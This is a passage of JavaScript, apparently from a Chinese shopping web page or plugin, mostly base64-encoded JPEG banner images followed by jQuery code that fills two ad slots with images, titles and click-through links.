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',
                    title:'剁手拼团',
                    icon:'惠',
                    url:'',
                    type:1,
                    index:2,
                    cnzzName:'广告2'
                }
            };
            $.each(adData,function (v,k) {
                $(`#plugMid627-ADImg${k.index}`).attr("data-mgMove",k.cnzzName);
                $(`#plugMid627-ADImg${k.index} .plugMid627-ADTitle`).html(k.title);
                $(`#plugMid627-ADImg${k.index} .plugMid627-ADIcon`).html(k.icon);
                if (k.type == 1) {
                    $(`#plugMid627-ADImg${k.index} .plugMid627-ADImg`).html(`<img src="${k.pic}" data-mgClick="${k.cnzzName}">`);
                } else if (k.type == 2) {
                    var itemHtml = `<div class="plugMid627-ADItem2" data-mgClick="${k.cnzzName}">
                        <div class="plugMid627-ADItem2-img"><img src="${k.pic}"></div>
                        <div class="plugMid627-ADItem2-box">
                            <div class="plugMid627-ADItem2-icon"></div>
                            <div class="plugMid627-ADItem2-title">${k.desc}</div>
                            <div class="plugMid627-ADItem2-price">¥${k.price}</div>
                        </div>
                    </div>`;
                    $(`#plugMid627-ADImg${k.index} .plugMid627-ADImg`).html(itemHtml);
                }
                $(`#plugMid627-ADImg${k.index} .plugMid627-ADImg`).click(function () {
                    if (k.url) {
                        openWindow(k.url);
                    }
                });
            });
        }();                                       //上面两个广告位模块1
        !function () {
            var tbCookie = '';
            // var adPic = '';
            var adPic = 'data:image/jpeg;base64,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